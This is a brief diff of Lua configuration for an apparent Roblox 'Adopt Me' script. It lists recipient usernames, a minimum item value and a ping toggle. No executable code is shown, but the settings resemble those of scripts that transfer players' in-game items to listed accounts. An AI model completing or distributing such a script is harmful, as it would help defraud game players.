@@ -1,4 +1,4 @@
-Adopt Me settings:
+
 _G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
